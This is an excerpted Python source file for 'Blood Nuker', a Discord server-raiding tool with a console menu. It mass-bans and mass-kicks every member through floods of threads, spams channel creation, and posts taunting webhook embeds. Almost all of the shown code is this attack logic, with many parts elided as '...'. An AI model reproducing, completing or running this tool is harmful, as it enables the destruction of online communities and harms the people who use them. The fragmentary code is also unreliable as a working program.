...
try:
  if os == "Windows":
    os.system('cls & title [Blood Nuker] - Starting & mode 69,20') 
except:
    os.system('clear')
    os.system('title [Blood Nuker] - Starting & mode 69,20')
        ...
        try:
            ...
            'embeds': [{
                ...
                'author': {
                    ...
                    'Blood fucks you',
                    'url':
                    'https://cdn.discordapp.com/attachments/1137988206864912426/1148944447854366790/tumblr_05f99bf022cb907ed4533caf9fcecb43_615184a0_400.gif',
                    'icon_url':
                    'https://cdn.discordapp.com/attachments/1137988206864912426/1148944447854366790/tumblr_05f99bf022cb907ed4533caf9fcecb43_615184a0_400.gif'
                },
                'footer': {
            ...
            'Blood Ruins You',
            'avatar_url':
            'https://cdn.discordapp.com/attachments/1152630829676232735/1152636915988828240/images_32.jpeg'
        }
...
async def menu():
    os.system(f'cls & mode 85,20 & title [Blood Nuker] - Connected: {client.user}')
...
{Style.BRIGHT}''')
    ...
    if choice == "1":
        ...
        while True:
            ...
            Thread(target=Blood.Ban, args=(guild.id, members_2[num],)).start()
            Thread(target=Blood.Ban, args=(guild.id, members_3[num],)).start()
            Thread(target=Blood.Ban, args=(guild.id, members_4[num],)).start()
            Thread(target=Blood.Ban, args=(guild.id, members_5[num],)).start()
            Thread(target=Blood.Ban, args=(guild.id, members_6[num],)).start()
    ...
    if choice == "2":
        ...
        while True:
            #try:
                Thread(target=Blood.Kick, args=(guild.id, members_1[num],)).start()
                Thread(target=Blood.Kick, args=(guild.id, members_2[num],)).start()
                Thread(target=Blood.Kick, args=(guild.id, members_3[num],)).start()
                num += 1
            #except IndexError:
               # break
            #except:
    ...
    if choice == "5":
        ...
        for i in range(channel_amount):
            Thread(target=Blood.CreateChannel, args=(guild.id,)).start()
...
try:
    ...
    RPC.update(details="Main Menu", large_image="Blood", small_image="Blood", large_text="Blood Nuker", start=time.time())
except:
    pass
@client.event
async def on_ready():
